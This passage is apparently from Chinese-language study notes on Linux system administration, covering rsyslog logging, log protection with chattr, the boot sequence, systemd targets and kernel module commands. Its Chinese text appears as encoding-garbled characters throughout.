æœ‰è‡ªå·±çš„æ—¥å¿—æ–‡ä»¶ç®¡ç†æœåŠ¡ â€“ systemd-journald.service. å…¶è®°å½•ä¸»è¦æ”¾åœ¨å†…å­˜ä¸­ã€‚å¯ä»¥é€šè¿‡ <code>journalctl</code> ä»¥åŠ <code>systemctl status unit.service</code> æ¥æŸ¥çœ‹å„ä¸ªä¸åŒæœåŠ¡çš„æ—¥å¿—æ–‡ä»¶.</p><h3 id="18-1-2-æ—¥å¿—æ–‡ä»¶å†…å®¹çš„ä¸€èˆ¬æ ¼å¼"><a href="#18-1-2-æ—¥å¿—æ–‡ä»¶å†…å®¹çš„ä¸€èˆ¬æ ¼å¼" class="headerlink" title="18.1.2 æ—¥å¿—æ–‡ä»¶å†…å®¹çš„ä¸€èˆ¬æ ¼å¼"></a>18.1.2 æ—¥å¿—æ–‡ä»¶å†…å®¹çš„ä¸€èˆ¬æ ¼å¼</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œç³»ç»Ÿäº§ç”Ÿçš„ä¿¡æ¯å¹¶è®°å½•ä¸‹æ¥çš„å†…å®¹ï¼Œéƒ½ä¼šè®°å½•è¿™äº›é‡è¦å†…å®¹:</p><ul><li>äº‹ä»¶å‘ç”Ÿçš„æ—¥æœŸä¸æ—¶é—´</li><li>å‘ç”Ÿæ­¤äº‹ä»¶çš„ä¸»æœºå </li><li>å¯åŠ¨æ­¤äº‹ä»¶çš„æœåŠ¡åç§°æˆ–å‘½ä»¤ä¸å‡½æ•°åç§°</li><li>è¯¥ä¿¡æ¯çš„å®é™…å†…å®¹<br>è¿™äº›ä¿¡æ¯çš„è¯¦ç»†åº¦æ˜¯å¯ä»¥æ›´æ”¹çš„.</li></ul><h2 id="18-2-rsyslog-service-è®°å½•æ—¥å¿—æ–‡ä»¶çš„æœåŠ¡"><a href="#18-2-rsyslog-service-è®°å½•æ—¥å¿—æ–‡ä»¶çš„æœåŠ¡" class="headerlink" title="18.2 rsyslog.service: è®°å½•æ—¥å¿—æ–‡ä»¶çš„æœåŠ¡"></a>18.2 rsyslog.service: è®°å½•æ—¥å¿—æ–‡ä»¶çš„æœåŠ¡</h2><h3 id="18-2-1-rsyslog-service-çš„é…ç½®æ–‡ä»¶-x2F-etc-x2F-rsyslog-conf"><a href="#18-2-1-rsyslog-service-çš„é…ç½®æ–‡ä»¶-x2F-etc-x2F-rsyslog-conf" class="headerlink" title="18.2.1 rsyslog.service çš„é…ç½®æ–‡ä»¶: &#x2F;etc&#x2F;rsyslog.conf"></a>18.2.1 rsyslog.service çš„é…ç½®æ–‡ä»¶: &#x2F;etc&#x2F;rsyslog.conf</h3><p>è¿™ä¸ªæ–‡ä»¶è§„å®šäº†:</p><ul><li>ä»€ä¹ˆæœåŠ¡</li><li>ä»€ä¹ˆç­‰çº§ä¿¡æ¯</li><li>éœ€è¦è¢«è®°å½•åœ¨å“ªé‡Œ (è®¾å¤‡æˆ–æ–‡ä»¶)</li></ul><h4 id="æœåŠ¡åç§°"><a href="#æœåŠ¡åç§°" class="headerlink" title="æœåŠ¡åç§°"></a>æœåŠ¡åç§°</h4><p>rsyslogd ä¸»è¦è¿˜æ˜¯é€šè¿‡ Linux å†…æ ¸æä¾›çš„ syslog ç›¸å…³è§„èŒƒæ¥è®¾ç½®æ•°æ®çš„åˆ†ç±».</p><p>æ¯ç§æœåŠ¡æ‰€äº§ç”Ÿçš„æ•°æ®é‡å·®å¼‚æ˜¯å¾ˆå¤§çš„.</p><p>Linux å†…æ ¸çš„ syslog æ”¯æŒçš„æœåŠ¡ç±»å‹ä¸»è¦æœ‰: (å¯ä½¿ç”¨ man 3 syslog æŸ¥çœ‹)</p><ul><li>0, kern</li><li>1, user</li><li>2, mail</li><li><ol start="3"><li>daemon</li></ol></li><li>4, auth</li><li>5, syslog</li><li>6, lpr</li><li>7, news</li><li>8, uucp</li><li>9, cron</li><li>10 authpriv</li><li>11 ftp</li><li>16 ï½ 23, local0 ï½ local7</li></ul><h4 id="ä¿¡æ¯ç­‰çº§"><a href="#ä¿¡æ¯ç­‰çº§" class="headerlink" title="ä¿¡æ¯ç­‰çº§"></a>ä¿¡æ¯ç­‰çº§</h4><p>åŸºæœ¬ä¸Šï¼ŒLinux å†…æ ¸çš„ syslog å°†ä¿¡æ¯åˆ†ä¸º 8 ä¸ªä¸»è¦çš„ä¿¡æ¯ç­‰çº§ï¼Œæ ¹æ® syslog.h çš„å®šä¹‰ï¼Œä¿¡æ¯åç§°ä¸æ•°å€¼çš„å¯¹åº”å¦‚ä¸‹:</p><ul><li>7 debug</li><li>6 info</li><li>5 notice</li><li>4 warning (warn)</li><li>3 err (error)</li><li>2 crit</li><li>1 alert</li><li>0 emerg (panic)</li></ul><p>ç­‰çº§è¶Šé è¿‘ 0 åˆ™ä»£è¡¨ç³»ç»Ÿå‡ºç°è‡´å‘½é—®é¢˜.</p><p>åœ¨ä¿¡æ¯ç­‰çº§ä¹‹å‰è¿˜æœ‰ <code>[.=!]</code> é“¾æ¥ç¬¦å·:</p><ul><li><code>.</code> ä»£è¡¨â€æ¯”åé¢è¿˜è¦ä¸¥é‡çš„ç­‰çº§(å«è¯¥ç­‰çº§)éƒ½è¢«è®°å½•ä¸‹æ¥â€</li><li><code>.=</code> ä»£è¡¨æ‰€éœ€è¦çš„ç­‰çº§å°±æ˜¯åé¢æ¥çš„ç­‰çº§</li><li><code>.!</code> ä»£è¡¨ä¸ç­‰äºï¼Œå°±æ˜¯é™¤äº†è¯¥ç­‰çº§å¤–çš„å…¶ä»–ç­‰çº§éƒ½è®°å½•</li></ul><h4 id="ä¿¡æ¯è®°å½•çš„æ–‡ä»¶åæˆ–è®¾å¤‡æˆ–ä¸»æœº"><a href="#ä¿¡æ¯è®°å½•çš„æ–‡ä»¶åæˆ–è®¾å¤‡æˆ–ä¸»æœº" class="headerlink" title="ä¿¡æ¯è®°å½•çš„æ–‡ä»¶åæˆ–è®¾å¤‡æˆ–ä¸»æœº"></a>ä¿¡æ¯è®°å½•çš„æ–‡ä»¶åæˆ–è®¾å¤‡æˆ–ä¸»æœº</h4><p>å¸¸è§çš„æ”¾ç½®å¤„:</p><ul><li>æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li><li>æ‰“å°æœºæˆ–å…¶ä»–</li><li>ç”¨æˆ·åç§°</li><li>è¿œç¨‹ä¸»æœº</li><li><code>*</code> ä»£è¡¨ç›®å‰åœ¨çº¿çš„æ‰€æœ‰äºº</li></ul><h4 id="æœåŠ¡ï¼Œdaemon-ä¸å‡½æ•°åç§°"><a href="#æœåŠ¡ï¼Œdaemon-ä¸å‡½æ•°åç§°" class="headerlink" title="æœåŠ¡ï¼Œdaemon ä¸å‡½æ•°åç§°"></a>æœåŠ¡ï¼Œdaemon ä¸å‡½æ•°åç§°</h4><p>daemon æ˜¯è½¯ä»¶.</p><p>service é€šå¸¸æ˜¯å¯åŠ¨ daemon çš„è„šæœ¬è®¾ç½®.</p><h3 id="18-2-2-æ—¥å¿—æ–‡ä»¶çš„å®‰å…¨æ€§è®¾ç½®"><a href="#18-2-2-æ—¥å¿—æ–‡ä»¶çš„å®‰å…¨æ€§è®¾ç½®" class="headerlink" title="18.2.2 æ—¥å¿—æ–‡ä»¶çš„å®‰å…¨æ€§è®¾ç½®"></a>18.2.2 æ—¥å¿—æ–‡ä»¶çš„å®‰å…¨æ€§è®¾ç½®</h3><p>rsyslogd çš„æ—¥å¿—æ–‡ä»¶åªè¦è¢«ç¼–è¾‘è¿‡å°±æ— æ³•ç»§ç»­è®°å½•.</p><p>å¯ä»¥ä½¿ç”¨ <code>chattr</code> å¢åŠ å±æ€§æ¥è®©æ—¥å¿—æ–‡ä»¶ä»…èƒ½è¢«å¢åŠ è€Œä¸èƒ½è¢«åˆ é™¤.</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chattr +a /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/admin.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><h3 id="18-2-3-æ—¥å¿—æ–‡ä»¶æœåŠ¡å™¨çš„è®¾ç½®"><a href="#18-2-3-æ—¥å¿—æ–‡ä»¶æœåŠ¡å™¨çš„è®¾ç½®" class="headerlink" title="18.2.3 æ—¥å¿—æ–‡ä»¶æœåŠ¡å™¨çš„è®¾ç½®"></a>18.2.3 æ—¥å¿—æ–‡ä»¶æœåŠ¡å™¨çš„è®¾ç½®</h3><h2 id="18-3-æ—¥å¿—æ–‡ä»¶çš„è®ºå¾ª-logrotate"><a href="#18-3-æ—¥å¿—æ–‡ä»¶çš„è®ºå¾ª-logrotate" class="headerlink" title="18.3 æ—¥å¿—æ–‡ä»¶çš„è®ºå¾ª (logrotate)"></a>18.3 æ—¥å¿—æ–‡ä»¶çš„è®ºå¾ª (logrotate)</h2><h2 id="19-1-Linux-çš„å¯åŠ¨æµç¨‹åˆ†æ"><a href="#19-1-Linux-çš„å¯åŠ¨æµç¨‹åˆ†æ" class="headerlink" title="19.1 Linux çš„å¯åŠ¨æµç¨‹åˆ†æ"></a>19.1 Linux çš„å¯åŠ¨æµç¨‹åˆ†æ</h2><h3 id="19-1-1-å¯åŠ¨æµç¨‹ä¸€è§ˆ"><a href="#19-1-1-å¯åŠ¨æµç¨‹ä¸€è§ˆ" class="headerlink" title="19.1.1 å¯åŠ¨æµç¨‹ä¸€è§ˆ"></a>19.1.1 å¯åŠ¨æµç¨‹ä¸€è§ˆ</h3><p>Boot loader å¯ä»¥æŒ‡å®šä½¿ç”¨å“ªä¸ªå†…æ ¸æ–‡ä»¶æ¥å¯åŠ¨ï¼Œå¹¶å®é™…åŠ è½½åˆ°å†…æ ¸ä¸­è§£å‹ç¼©ä¸æ‰§è¡Œã€‚æ­¤æ—¶å†…æ ¸å°±èƒ½å¤Ÿå¼€å§‹åœ¨å†…å­˜ä¸­æ´»åŠ¨ï¼Œå¹¶æ£€æµ‹æ‰€æœ‰ç¡¬ä»¶ä¿¡æ¯ä¸åŠ è½½é€‚å½“çš„é©±åŠ¨ç¨‹åºæ¥ä½¿æ•´å°ä¸»æœºå¼€å§‹è¿è¡Œï¼Œç­‰åˆ°å†…æ ¸æ£€æµ‹ç¡¬ä»¶ä¸åŠ è½½é©±åŠ¨ç¨‹åºå®Œæ¯•åï¼Œæ“ä½œç³»ç»Ÿä¾¿å¼€å§‹è¿è¡Œ.</p><h3 id="19-1-2-BIOS-boot-loader-ä¸-kernel-åŠ è½½"><a href="#19-1-2-BIOS-boot-loader-ä¸-kernel-åŠ è½½" class="headerlink" title="19.1.2 BIOS, boot loader ä¸ kernel åŠ è½½"></a>19.1.2 BIOS, boot loader ä¸ kernel åŠ è½½</h3><p>BIOS, æ— è®ºä¼ ç»Ÿ BIOS è¿˜æ˜¯ UEFI BIOS éƒ½ä¼šè¢«ç®€ç§°ä¸º BIOS.</p><p>åœ¨ä¸ªäººè®¡ç®—æœºæ¶æ„ä¸‹ï¼Œå¯åŠ¨æ•´ä¸ªç³»ç»Ÿé¦–å…ˆå°±è¦è®©ç³»ç»Ÿå»åŠ è½½ BIOS (Basic Input Output System), å¹¶é€šè¿‡ BIOS ç¨‹åºå»åŠ è½½ CMOS ä¿¡æ¯ï¼Œå¹¶ä¸”å€Ÿç”± CMOS å†…çš„è®¾ç½®å–å¾—ä¸»æœºçš„å„é¡¹ç¡¬ä»¶é…ç½®. åœ¨å–å¾—è¿™äº›ä¿¡æ¯åï¼ŒBIOS ä¼šè¿›è¡Œå¯åŠ¨è‡ªæˆ‘æ£€æµ‹ (Power-on Self Test, POST), ç„¶åå¼€å§‹æ‰§è¡Œç¡¬ä»¶æ£€æµ‹çš„åˆå§‹åŒ–ï¼Œå¹¶è®¾ç½® PnP è®¾å¤‡ï¼Œä¹‹åå†å®šä¹‰å‡ºå¯å¯åŠ¨çš„è®¾å¤‡é¡ºåºï¼Œæ¥ä¸‹æ¥å°±ä¼šå¼€å§‹è¿›è¡Œè®¾å¤‡çš„æ•°æ®è¯»å–.</p><p>Boot loader ä½äºå¯åŠ¨è®¾å¤‡çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸­ã€‚</p><h4 id="boot-loader-çš„åŠŸèƒ½"><a href="#boot-loader-çš„åŠŸèƒ½" class="headerlink" title="boot loader çš„åŠŸèƒ½"></a>boot loader çš„åŠŸèƒ½</h4><p>loader çš„ä¸»è¦åŠŸèƒ½æ˜¯è¯†åˆ«æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶æ ¼å¼.</p><p>ç”±äºä¸åŒæ“ä½œç³»ç»Ÿçš„æ–‡ä»¶æ ¼å¼ä¸ä¸€è‡´ï¼Œå› æ­¤æ¯ç§æ“ä½œç³»ç»Ÿéƒ½æœ‰è‡ªå·±çš„ boot loader.</p><p>é€šå¸¸æ“ä½œç³»ç»Ÿé»˜è®¤éƒ½ä¼šå®‰è£…ä¸€ä»½ loader åˆ°å®ƒæ ¹ç›®å½•æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿçš„ boot sector ä¸Š.</p><p>boot loader ä¸»è¦çš„åŠŸèƒ½å¦‚ä¸‹:</p><ul><li>æä¾›é€‰é¡¹ï¼šç”¨æˆ·å¯ä»¥é€‰æ‹©ä¸åŒçš„å¯åŠ¨é€‰é¡¹, è¿™ä¹Ÿæ˜¯å¤šé‡å¼•å¯¼çš„é‡è¦åŠŸèƒ½</li><li>åŠ è½½å†…æ ¸æ–‡ä»¶: ç›´æ¥æŒ‡å‘å¯å¯åŠ¨çš„ç¨‹åºåŒºåŸŸæ¥å¯åŠ¨æ“ä½œç³»ç»Ÿ</li><li>è½¬äº¤å…¶ä»– loader: å°†å¯åŠ¨ç®¡ç†åŠŸèƒ½è½¬äº¤ç»™å…¶ä»– loader è´Ÿè´£</li></ul><p>å†…æ ¸æ–‡ä»¶ä¸€èˆ¬è¢«æ”¾ç½®åœ¨ <code>/boot</code> é‡Œï¼Œå¹¶å»åä¸º <code>/boot/vmlinuz</code>.</p><p>Linux å†…æ ¸å¯ä»¥é€šè¿‡åŠ¨æ€åŠ è½½å†…æ ¸æ¨¡å—ï¼Œè¿™äº›æ¨¡å—æ”¾ç½®åœ¨ <code>/lib/modules</code> ç›®å½•å†…ã€‚</p><p>ç”±äºæ¨¡å—æ”¾ç½®åˆ°ç£ç›˜æ ¹ç›®å½•å†…ï¼Œå› æ­¤å¯åŠ¨çš„è¿‡ç¨‹ä¸­å†…æ ¸å¿…é¡»è¦æŒ‚åœ¨æ ¹ç›®å½•ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿè¯»å–å†…æ ¸æ¨¡å—æä¾›çš„åŠ è½½é©±åŠ¨ç¨‹åºåŠŸèƒ½.</p><p>ä¸€èˆ¬æ¥è¯´ï¼ŒLinux å‘è¡Œç‰ˆéƒ½ä¼šå°†éå¿…è¦çš„åŠŸèƒ½ä¸”å¯ä»¥ç¼–è¯‘æˆä¸ºæ¨¡å—çš„å†…æ ¸åŠŸèƒ½ï¼Œç¼–è¯‘æˆä¸ºæ¨¡å—.</p><p>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ (Initial RAM Filesystem) ä¸€èˆ¬ä½¿ç”¨çš„æ–‡ä»¶åä¸º <code>/boot/initrd</code> æˆ– <code>/boot/initramfs</code>, è¿™ä¸ªæ–‡ä»¶å¯ä»¥é€šè¿‡ boot loader æ¥åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œç„¶åè¿™ä¸ªæ–‡ä»¶ä¼šè¢«è§£å‹ç¼©å¹¶ä¸”åœ¨å†…å­˜ä¸­æ¨¡æ‹Ÿæˆä¸€ä¸ªæ ¹ç›®å½•.</p><h3 id="19-1-3-ç¬¬ä¸€ä¸ªç¨‹åº-systemd-åŠä½¿ç”¨-default-target-è¿›å…¥å¯åŠ¨ç¨‹åºåˆ†æ"><a href="#19-1-3-ç¬¬ä¸€ä¸ªç¨‹åº-systemd-åŠä½¿ç”¨-default-target-è¿›å…¥å¯åŠ¨ç¨‹åºåˆ†æ" class="headerlink" title="19.1.3 ç¬¬ä¸€ä¸ªç¨‹åº systemd åŠä½¿ç”¨ default.target è¿›å…¥å¯åŠ¨ç¨‹åºåˆ†æ"></a>19.1.3 ç¬¬ä¸€ä¸ªç¨‹åº systemd åŠä½¿ç”¨ default.target è¿›å…¥å¯åŠ¨ç¨‹åºåˆ†æ</h3><p>systemd æœ€ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯å‡†å¤‡è½¯ä»¶æ‰§è¡Œçš„ç¯å¢ƒï¼ŒåŒ…æ‹¬ç³»ç»Ÿçš„ä¸»æœºåï¼Œç½‘ç»œè®¾ç½®ï¼Œè¯­è¨€è®¾ç½®ï¼Œæ–‡ä»¶ç³»ç»Ÿæ ¼å¼åŠå…¶ä»–æœåŠ¡çš„å¯åŠ¨ç­‰.</p><p>è¦çŸ¥é“ç³»ç»ŸæœåŠ¡çš„å¯ç”¨æµç¨‹ï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯:</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-dependencies</span> <span class="hljs-string">graphical</span>.<span class="hljs-string">target</span><br></code></pre></td></tr></table></figure><h3 id="19-1-4-systemd-æ‰§è¡Œ-sysinit-target-åˆå§‹åŒ–ç³»ç»Ÿï¼Œbasic-target-å‡†å¤‡ç³»ç»Ÿ"><a href="#19-1-4-systemd-æ‰§è¡Œ-sysinit-target-åˆå§‹åŒ–ç³»ç»Ÿï¼Œbasic-target-å‡†å¤‡ç³»ç»Ÿ" class="headerlink" title="19.1.4 systemd æ‰§è¡Œ sysinit.target åˆå§‹åŒ–ç³»ç»Ÿï¼Œbasic.target å‡†å¤‡ç³»ç»Ÿ"></a>19.1.4 systemd æ‰§è¡Œ sysinit.target åˆå§‹åŒ–ç³»ç»Ÿï¼Œbasic.target å‡†å¤‡ç³»ç»Ÿ</h3><h3 id="19-1-5-systemd-å¯åŠ¨-multi-user-target-ä¸‹çš„æœåŠ¡"><a href="#19-1-5-systemd-å¯åŠ¨-multi-user-target-ä¸‹çš„æœåŠ¡" class="headerlink" title="19.1.5 systemd å¯åŠ¨ multi-user.target ä¸‹çš„æœåŠ¡"></a>19.1.5 systemd å¯åŠ¨ multi-user.target ä¸‹çš„æœåŠ¡</h3><p>å„ç§ä¸»æœºæœåŠ¡ä»¥åŠæä¾›æœåŠ¡å™¨åŠŸèƒ½çš„ç½‘ç»œæœåŠ¡çš„å¯åŠ¨ï¼Œå¤§å¤šé™„å±ä¸ <code>multi-user.target</code>.</p><p>ä¸€èˆ¬æœåŠ¡çš„å¯åŠ¨è„šæœ¬è®¾ç½®éƒ½æ”¾åœ¨ä¸‹é¢çš„ç›®å½•å†…:</p><ul><li><code>/usr/lib/systemd/system</code> , ç³»ç»Ÿé»˜è®¤çš„æœåŠ¡å¯åŠ¨è„šæœ¬è®¾ç½®</li><li><code>/etc/systemd/system</code> , ç®¡ç†å‘˜è‡ªå·±å¼€å‘ä¸è®¾ç½®çš„è„šæœ¬è®¾ç½®</li></ul><p>å°†æœåŠ¡æ”¾åˆ° <code>/etc/systemed/system/multi-user.target.want</code> ä¸‹å°±å¯ä»¥åœ¨å¯åŠ¨æ—¶å¯åŠ¨å®ƒ.</p><p>å½“ç³»ç»Ÿå®Œæˆå¯åŠ¨åï¼Œè¿˜æƒ³è¦ç³»ç»Ÿé¢å¤–æ‰§è¡ŒæŸäº›ç¨‹åºçš„è¯ï¼Œå¯ä»¥å°†ç¨‹åºå‘½ä»¤æˆ–è„šæœ¬çš„ç»å¯¹è·¯å¾„åç§°å†™å…¥åˆ° <code>/etc/rc.d/rc.local</code> è¿™ä¸ªæ–‡ä»¶ä¸‹ã€‚ å½“ <code>rc.local</code> å…·æœ‰å¯æ‰§è¡Œæƒé™æ—¶æ‰ä¼šè¢«æ‰§è¡Œã€‚</p><h4 id="æä¾›-tty-ç•Œé¢ä¸ç™»å½•æœåŠ¡"><a href="#æä¾›-tty-ç•Œé¢ä¸ç™»å½•æœåŠ¡" class="headerlink" title="æä¾› tty ç•Œé¢ä¸ç™»å½•æœåŠ¡"></a>æä¾› tty ç•Œé¢ä¸ç™»å½•æœåŠ¡</h4><p><code>multi-user.target</code> ä¸‹é¢çš„ <code>getty.target</code> æ“ä½œç•Œé¢é€‰é¡¹æ˜¯æä¾› tty ç•Œé¢ã€‚</p><p>ç”¨æˆ·ç™»å½•æœåŠ¡ä¹Ÿæ˜¯åœ¨ <code>multi-user.target</code> ä¸‹ã€‚</p><h3 id="19-1-6-systemd-å¯åŠ¨-graphical-target-ä¸‹é¢çš„æœåŠ¡"><a href="#19-1-6-systemd-å¯åŠ¨-graphical-target-ä¸‹é¢çš„æœåŠ¡" class="headerlink" title="19.1.6 systemd å¯åŠ¨ graphical.target ä¸‹é¢çš„æœåŠ¡"></a>19.1.6 systemd å¯åŠ¨ graphical.target ä¸‹é¢çš„æœåŠ¡</h3><p>å¦‚æœ <code>default.target</code> æ˜¯ <code>multi-user.target</code>ï¼Œè¿™ä¸ªæ­¥éª¤å°±ä¸ä¼šæ‰§è¡Œ.</p><h3 id="19-1-7-å¯åŠ¨è¿‡ç¨‹ä¼šç”¨åˆ°çš„ä¸»è¦é…ç½®æ–‡ä»¶"><a href="#19-1-7-å¯åŠ¨è¿‡ç¨‹ä¼šç”¨åˆ°çš„ä¸»è¦é…ç½®æ–‡ä»¶" class="headerlink" title="19.1.7 å¯åŠ¨è¿‡ç¨‹ä¼šç”¨åˆ°çš„ä¸»è¦é…ç½®æ–‡ä»¶"></a>19.1.7 å¯åŠ¨è¿‡ç¨‹ä¼šç”¨åˆ°çš„ä¸»è¦é…ç½®æ–‡ä»¶</h3><p>å‡ ä¸ªå¸¸è§çš„æ¯”è¾ƒé‡è¦çš„é…ç½®æ–‡ä»¶:</p><h4 id="å…³äºæ¨¡å—-etc-modprobe-d-conf-åŠ-etc-modules-load-d-conf"><a href="#å…³äºæ¨¡å—-etc-modprobe-d-conf-åŠ-etc-modules-load-d-conf" class="headerlink" title="å…³äºæ¨¡å—: /etc/modprobe.d/*.conf åŠ /etc/modules-load,d/*.conf"></a>å…³äºæ¨¡å—: <code>/etc/modprobe.d/*.conf</code> åŠ <code>/etc/modules-load,d/*.conf</code></h4><ul><li><code>/etc/modprobe.d/*.conf</code> æ˜¯å¯ä»¥åŠ ä¸Šæ¨¡å—å‚æ•°çš„ä½ç½®</li><li><code>/etc/modules-load.d/*.conf</code> æ˜¯å•çº¯åŠ è½½æ¨¡å—çš„ä½ç½®</li></ul><p><code>systemctl restart systemd-modules-load.service</code> å¯é‡æ–°åŠ è½½æ¨¡å—.</p><h2 id="19-2-å†…æ ¸ä¸å†…æ ¸æ¨¡å—"><a href="#19-2-å†…æ ¸ä¸å†…æ ¸æ¨¡å—" class="headerlink" title="19.2 å†…æ ¸ä¸å†…æ ¸æ¨¡å—"></a>19.2 å†…æ ¸ä¸å†…æ ¸æ¨¡å—</h2><p>åœ¨æ•´ä¸ªå¯åŠ¨çš„è¿‡ç¨‹å½“ä¸­ï¼Œæ˜¯å¦èƒ½å¤ŸæˆåŠŸé©±åŠ¨æˆ‘ä»¬çš„ä¸»æœºçš„ç¡¬ä»¶è®¾å¤‡æ˜¯å†…æ ¸ (kernel) çš„å·¥ä½œã€‚</p><p>å†…æ ¸ä¸€èˆ¬ä¸ºå‹ç¼©æ–‡ä»¶ï¼Œå› æ­¤åœ¨ä½¿ç”¨å†…æ ¸ä¹‹å‰ï¼Œå°±çš„è¦å°†å®ƒè§£å‹ç¼©åï¼Œæ‰èƒ½åŠ è½½åˆ°å†…å­˜å½“ä¸­.</p><p>å†…æ ¸ä¸æ¨¡å—çš„å­˜æ”¾ä½ç½®:</p><ul><li>å†…æ ¸: <code>/boot/vmlinuz</code> æˆ– <code>/boot/vmlinuz-version</code></li><li>å†…æ ¸è§£å‹ç¼©æ‰€éœ€çš„ RAM Disk: <code>/boot/inistramfs</code> æˆ– <code>/boot/inistramfs-version</code></li><li>å†…æ ¸æ¨¡å—: <code>/lib/modules/version/kernel</code> æˆ– <code>/lib/modules/$(uname -r)/kernel</code></li><li>å†…æ ¸æºä»£ç : <code>/usr/src/linux</code> æˆ– <code>/usr/src/kernels</code> (é»˜è®¤ä¸å®‰è£…)</li></ul><p>æ·»åŠ æ–°ç¡¬ä»¶æ”¯æŒ:</p><ul><li>é‡æ–°ç¼–è¯‘å†…æ ¸ï¼Œå¹¶åŠ å…¥æœ€æ–°çš„ç¡¬ä»¶é©±åŠ¨ç¨‹åºæºä»£ç </li><li>å°†è¯¥ç¡¬ä»¶çš„é©±åŠ¨ç¨‹åºç¼–è¯‘æˆä¸ºæ¨¡å—ï¼Œåœ¨å¯åŠ¨æ—¶åŠ è½½è¯¥æ¨¡å—</li></ul><h3 id="19-2-1-å†…æ ¸æ¨¡å—ä¸ä¾èµ–æ€§"><a href="#19-2-1-å†…æ ¸æ¨¡å—ä¸ä¾èµ–æ€§" class="headerlink" title="19.2.1 å†…æ ¸æ¨¡å—ä¸ä¾èµ–æ€§"></a>19.2.1 å†…æ ¸æ¨¡å—ä¸ä¾èµ–æ€§</h3><p>æ£€æŸ¥ <code>/lib/modules/$(uname -r)/modules.dep</code> è¿™ä¸ªæ–‡ä»¶ï¼Œå…¶è®°å½•äº†å†…æ ¸æ”¯æŒçš„æ¨¡å—çš„å„é¡¹ä¾èµ–æ€§.</p><p>ä½¿ç”¨ <code>depmod</code> å‘½ä»¤ä¹‹åï¼Œè¯¥ç¨‹åºä¼šè·‘åˆ°æ¨¡å—æ ‡å‡†æ”¾ç½®ç›®å½• <code>/lib/modules/$(uname -r)/kernel</code>ï¼Œå¹¶ä¸€å¥ç›¸å…³ç›®å½•çš„å®šä¹‰å°†å…¨éƒ¨çš„æ¨¡å—è¯»å–å‡ºæ¥åˆ†æï¼Œæœ€ç»ˆå°†åˆ†æçš„ç»“æœå†™å…¥ <code>modules.dep</code> æ–‡ä»¶ä¸­.</p><h4 id="19-2-2-æŸ¥çœ‹å†…æ ¸æ¨¡å—"><a href="#19-2-2-æŸ¥çœ‹å†…æ ¸æ¨¡å—" class="headerlink" title="19.2.2 æŸ¥çœ‹å†…æ ¸æ¨¡å—"></a>19.2.2 æŸ¥çœ‹å†…æ ¸æ¨¡å—</h4><p>ä½¿ç”¨ <code>lsmod</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹ç›®å‰å†…æ ¸åŠ è½½äº†å¤šå°‘æ¨¡å—.</p><p>æ˜¾ç¤ºçš„å†…å®¹åŒ…æ‹¬:</p><ul><li>æ¨¡å—åç§° (Module)</li><li>æ¨¡å—çš„å¤§å° (Size)</li><li>æ¬¡æ¨¡å—æ˜¯å¦è¢«å…¶ä»–æ¨¡å—æ‰€ä½¿ç”¨ (Used by)</li></ul><p>ä½¿ç”¨ <code>modinfo</code> å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹åœ¨å†…æ ¸ä¸­çš„æ¨¡å—ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹æŸä¸ªæ¨¡å—æ–‡ä»¶.</p><h3 id="19-2-3-å†…æ ¸æ¨¡å—çš„åŠ è½½ä¸åˆ é™¤"><a href="#19-2-3-å†…æ ¸æ¨¡å—çš„åŠ è½½ä¸åˆ é™¤" class="headerlink" title="19.2.3 å†…æ ¸æ¨¡å—çš„åŠ è½½ä¸åˆ é™¤"></a>19.2.3 å†…æ ¸æ¨¡å—çš„åŠ è½½ä¸åˆ é™¤</h3><p>ä½¿ç”¨ <code>modprobe</code> è¿™ä¸ªå‘½ä»¤æ¥åŠ è½½æ¨¡å—ï¼Œ<code>modprobe</code> ä¼šä¸»åŠ¨æŸ¥æ‰¾ <code>modules.dep</code> çš„å†…å®¹ï¼Œå…ˆè§£å†³äº†æ¨¡å—çš„ä¾èµ–æ€§åï¼Œæ‰å†³å®šéœ€è¦åŠ è½½çš„æ¨¡å—æœ‰å“ªäº›. å…¶å¯åŠ è½½ä¹Ÿå¯åˆ é™¤.</p><p><code>insmod</code> éœ€è¦æä¾›å®Œæ•´æ–‡ä»¶åçš„æ¨¡å—ã€‚</p><p>å†…æ ¸æ¨¡å—ä¸€å®šæ˜¯ <code>.ko</code> ç»“å°¾çš„ã€‚</p><h3 id="19-2-4-å†…æ ¸æ¨¡å—çš„é¢å¤–å‚æ•°è®¾ç½®-etc-modprobe-d-conf"><a href="#19-2-4-å†…æ ¸æ¨¡å—çš„é¢å¤–å‚æ•°è®¾ç½®-etc-modprobe-d-conf" class="headerlink" title="19.2.4 å†…æ ¸æ¨¡å—çš„é¢å¤–å‚æ•°è®¾ç½®: /etc/modprobe.d/*.conf"></a>19.2.4 å†…æ ¸æ¨¡å—çš„é¢å¤–å‚æ•°è®¾ç½®: <code>/etc/modprobe.d/*.conf</code></h3><h2 id="19-3-Boot-Loader-Grub2"><a href="#19-3-Boot-Loader-Grub2" class="headerlink" title="19.3 Boot Loader: Grub2"></a>19.3 Boot Loader: Grub2</h2><h3 id="19-3-1-boot-loader-çš„ä¸¤ä¸ª-stage"><a href="#19-3-1-boot-loader-çš„ä¸¤ä¸ª-stage" class="headerlink" title="19.3.1 boot loader çš„ä¸¤ä¸ª stage"></a>19.3.1 boot loader çš„ä¸¤ä¸ª stage</h3><p>åœ¨ BIOS è¯»å®Œä¿¡æ¯åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å›åˆ°ç¬¬ä¸€ä¸ªå¯åŠ¨è®¾å¤‡çš„ MBR å»è¯»å– boot 